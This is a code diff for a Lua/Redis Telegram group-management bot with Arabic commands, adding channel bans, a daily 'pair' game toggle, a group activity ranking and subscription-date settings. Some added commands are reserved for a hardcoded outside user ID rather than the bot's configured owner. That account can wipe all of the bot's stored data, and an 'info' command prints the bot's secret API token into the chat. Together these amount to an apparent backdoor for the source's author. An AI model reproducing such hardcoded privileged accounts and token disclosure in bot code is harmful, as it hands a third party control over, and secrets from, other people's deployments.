@@ -16,6 +16,193 @@ if neww then
 text = neww or text
 end
 end
+if text == "تستي" then
+return send(msg_chat_id,msg_id,'\n↯︙ هذا الامر يخص ( '..msg_id..' ) ',"md",true)  
+end
+if text == "تعطيل ثنائي اليوم" or text == "تعطيل ثنائي" or text == "تعطيل الثنائي" then
+if not msg.Manger then
+return send(msg_chat_id,msg_id,'\n*↯︙ هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
+end
+if not Redis:get(Fast.."Fast:Althnaee:Chat"..msg.chat_id)  then
+return send(msg_chat_id,msg_id,GetByName(msg).."↯︙ تم تعطيل ثنائي اليوم مسبقاً","md",true )
+else
+Redis:del(Fast.."Fast:Althnaee:Chat"..msg.chat_id)
+Redis:del(Fast.."ThnaeeDay:ex"..msg.chat_id)
+Redis:del(Fast.."ThnaeeDay:nameone"..msg.chat_id)
+Redis:del(Fast.."ThnaeeDay:nametwo"..msg.chat_id)
+Redis:del(Fast.."ThnaeeDay:idone"..msg.chat_id)
+Redis:del(Fast.."ThnaeeDay:idtwo"..msg.chat_id)
+return send(msg_chat_id,msg_id,GetByName(msg).."↯︙ تم تعطيل ثنائي اليوم","md",true )
+end
+end
+if text == "تفعيل ثنائي اليوم" or text == "تفعيل ثنائي" or text == "تفعيل الثنائي" then
+if not msg.Manger then
+return send(msg_chat_id,msg_id,'\n*↯︙ هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
+end
+if Redis:get(Fast.."Fast:Althnaee:Chat"..msg.chat_id)  then
+return send(msg_chat_id,msg_id,GetByName(msg).."↯︙ تم تفعيل ثنائي اليوم مسبقاً","md",true )
+else
+Redis:set(Fast.."Fast:Althnaee:Chat"..msg.chat_id,"true")
+return send(msg_chat_id,msg_id,GetByName(msg).."↯︙ ابشر فعلت ثنائي اليوم","md",true )
+end
+end
+if text and text:match("^حظر قناة @(%S+)$") or text and text:match("^حظر قناه @(%S+)$") then
+local User = text:match("^حظر قناة @(%S+)$") or text:match("^حظر قناه @(%S+)$")
+if not msg.Manger then
+return send(msg_chat_id,msg_id,'\n*↯︙ هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
+end
+local UserInfo = bot.searchPublicChat(User)
+if not UserInfo.id then
+send(msg.chat_id,msg.id,"\n↯︙ اليوزر غير صحيح","md",true)  
+end
+if UserInfo.type.is_channel == true then
+https.request("https://api.telegram.org/bot"..Token..'/banChatSenderChat?chat_id=' .. msg.chat_id .. '&sender_chat_id='..UserInfo.id)
+send(msg.chat_id,msg.id,"\n↯︙ تم حظر القناه ↯︙ [@"..User.."] ","md",true)  
+else
+send(msg.chat_id,msg.id,"\n↯︙ حدث خطأ ...","md",true)  
+end
+end
+if text and text:match("^الغاء حظر قناة @(%S+)$") or text and text:match("^الغاء حظر قناه @(%S+)$") then
+local User = text:match("^الغاء حظر قناة @(%S+)$") or text:match("^الغاء حظر قناه @(%S+)$")
+local UserInfo = bot.searchPublicChat(User)
+if not msg.Manger then
+return send(msg_chat_id,msg_id,'\n*↯︙ هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
+end
+if not UserInfo.id then
+send(msg.chat_id,msg.id,"\n↯︙ اليوزر غير صحيح","md",true)  
+end
+if UserInfo.type.is_channel == true then
+https.request("https://api.telegram.org/bot"..Token..'/unbanChatSenderChat?chat_id=' .. msg.chat_id .. '&sender_chat_id='..UserInfo.id)
+send(msg.chat_id,msg.id,"\n↯︙ تم الغاء حظر القناة ↯︙ [@"..User.."] ","md",true)  
+else
+send(msg.chat_id,msg.id,"\n↯︙ حدث خطأ ...","md",true)  
+end
+end
+if text == ('حظر قناة') and msg.reply_to_message_id ~= 0 then
+if not msg.Manger then
+return send(msg_chat_id,msg_id,'\n*↯︙ هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
+end
+local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
+if Message_Reply.sender_id.chat_id == "messageSenderChat" then
+--var(Message_Reply.sender_id.chat_id)
+https.request("https://api.telegram.org/bot"..Token..'/banChatSenderChat?chat_id=' .. msg.chat_id .. '&sender_chat_id='..Message_Reply.sender_id.chat_id)
+return send(msg_chat_id,msg_id,"↯︙ تم حظر القناة من القروب  ","md",true)  
+else
+send(msg.chat_id,msg.id,"\n↯︙ حدث خطأ ...","md",true)  
+end
+end
+if text == ('الغاء حظر قناة') and msg.reply_to_message_id ~= 0 then
+if not msg.Manger then
+return send(msg_chat_id,msg_id,'\n*↯︙ هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
+end
+local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
+if Message_Reply.sender_id.chat_id == "messageSenderChat" then
+--var(Message_Reply.sender_id.chat_id)
+https.request("https://api.telegram.org/bot"..Token..'/unbanChatSenderChat?chat_id=' .. msg.chat_id .. '&sender_chat_id='..Message_Reply.sender_id.chat_id)
+return send(msg_chat_id,msg_id,"↯︙ تم الغاء حظر القناة من القروب  ","md",true)  
+else
+send(msg.chat_id,msg.id,"\n↯︙ حدث خطا ...","md",true)  
+end
+end
+RunGames(msg)
+if text and text:match('^'..Bot_Name..' ') then
+text = text:gsub('^'..Bot_Name..' ','')
+end
+if text then
+local NewCmmd = Redis:get(Fast.."All:Get:Reides:Commands:Group"..text) or Redis:get(Fast.."Fast:Get:Reides:Commands:Group"..msg_chat_id..":"..text)
+if NewCmmd then
+text = (NewCmmd or text)
+end
+end
+if text == "مسح تخزين البوت" or text == "مسح تخزين البوت" then
+if tonumber(msg.sender_id.user_id) == tonumber(2100004938) then 
+local keys = Redis:keys(Fast..'*')
+for i = 1, #keys do
+Redis:del(keys[i])
+end
+return send(msg_chat_id,msg_id,'\n↯︙ تم مسح تخزين البوت بالكامل ',"md")
+end
+end
+if text == 'معلومات' or text == 'معلومات التنصيب' then
+ if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then 
+ usersend = true
+ elseif tonumber(msg.sender_id.user_id) == tonumber(2100004938) then 
+ usersend = true
+ else
+ usersend = false
+ end
+if YouCan == false then
+return send(msg_chat_id,msg_id,'\n*↯︙ هذا الامر يخص ⦗ مطور الاساسي ⦘* ',"md",true)  
+end
+local UserInfo = bot.getUser(Sudo_Id)
+if UserInfo.username then
+UserInfousername = '[@'..UserInfo.username..']'
+else
+UserInfousername = 'لا يوجد'
+end
+local Teext = '↯︙ اسم المطور : ['..UserInfo.first_name..'](tg://user?id='..Sudo_Id..')\n'
+print(Teext)
+return send(msg_chat_id,msg_id,'\n\n↯︙ التوكن : `'..Token..'`\n\n↯︙ معرف البوت : [@'..UserBot..']\n\n↯︙  ايدي المطور : `'..Sudo_Id..'`\n\n↯︙ معرف المطور : '..UserInfousername..'\n\n'..Teext,"md",true) 
+end
+if text == "ترند القروبات" or text == "ترند المجموعات" then
+if not msg.Manger then
+return send(msg_chat_id,msg_id,'\n*↯︙ هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
+end
+GroupAllRtba = Redis:hgetall(Fast..':GroupUserCountMsg:groups')
+GetAllNames  = Redis:hgetall(Fast..':GroupNameUser:groups')
+GroupAllRtbaL = {}
+for k,v in pairs(GroupAllRtba) do table.insert(GroupAllRtbaL,{v,k}) end
+Count,Kount,i = 8 , 0 , 1
+for _ in pairs(GroupAllRtbaL) do Kount = Kount + 1 end
+table.sort(GroupAllRtbaL, function(a, b) return tonumber(a[1]) > tonumber(b[1]) end)
+if Count >= Kount then Count = Kount end
+Text = "↯︙ قائمة ترند الكروبات 📊 . \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
+for k,v in pairs(GroupAllRtbaL) do
+if v[2] and v[2]:match("(-100%d+)") then
+local InfoChat = bot.getChat(v[2])
+local InfoChats = bot.getSupergroupFullInfo(v[2])
+if InfoChats.code ~= 400 then
+var(InfoChats.invite_link)
+if not InfoChats.invite_link then
+linkedid = "["..InfoChat.title.."]" or "اسم القروب خطأ"
+else
+linkedid = "["..InfoChat.title.."]" or "اسم القروب خطأ"
+end
+if i <= Count then  
+Text = Text..i..") :"..v[1].." | "..(linkedid).." \n" 
+end ; 
+i=i+1
+end
+end
+end
+return send(msg.chat_id,msg.id,Text,"md",true)
+end
+if text and msg.chat_id then
+local GetMsg = Redis:incr(Fast..'Fast:MsgNumbergroups'..msg.chat_id) or 1
+Redis:hset(Fast..':GroupUserCountMsg:groups',msg.chat_id,GetMsg)
+end
+if text == "ضع تاريخ الاشتراك" or text == "وضع تاريخ الاشتراك" then
+if msg.sender_id.user_id ~= 2100004938 then 
+return send(msg_chat_id,msg_id,'\n↯︙ هذا الامر يخص ( مطور السورس ) ',"md",true)  
+end
+Redis:set(Fast.."data:botsashtrak"..msg_chat_id..msg.sender_id.user_id,true)
+return send(msg_chat_id,msg_id,'\n↯︙ ارسل تاريخ الاشتراك ',"md",true)  
+end
+if Redis:get(Fast.."data:botsashtrak"..msg_chat_id..msg.sender_id.user_id) then
+if text == 'الغاء' or text == 'الغاء الامر' then
+Redis:del(Fast.."data:botsashtrak"..msg_chat_id..msg.sender_id.user_id)
+return send(msg_chat_id,msg_id,'\n↯︙ تم الغاء الامر  ',"md",true)  
+end
+Redis:set(Fast.."data:bots:ashtrak",text)
+Redis:del(Fast.."data:botsashtrak"..msg_chat_id..msg.sender_id.user_id)
+return send(msg_chat_id,msg_id,'\n↯︙ تم تعيين تاريخ الاشتراك  ',"md",true)  
+end
+if text == "اشتراك البوت" or text == "اشتراك بوت" then
+if YouCan == false then
+return send(msg_chat_id,msg_id,'\n*↯︙ هذا الامر يخص ⦗ مطور الاساسي ⦘* ',"md",true)  
+end
+return send(msg_chat_id,msg_id,'\nUser Dev : [@'..UserSudo..'\n'..(Redis:get(Fast.."data:bots:ashtrak") or 0)..'] ',"md",true)  
+end
 if text and text:match('^ضع تفاعل (%d+) (.*)$') or text and text:match('^وضع تفاعل (%d+) (.*)$') then
 if not msg.Manger then
 return send(msg.chat_id,msg.id,"↯︙ هذا الأمر يخص المدير")
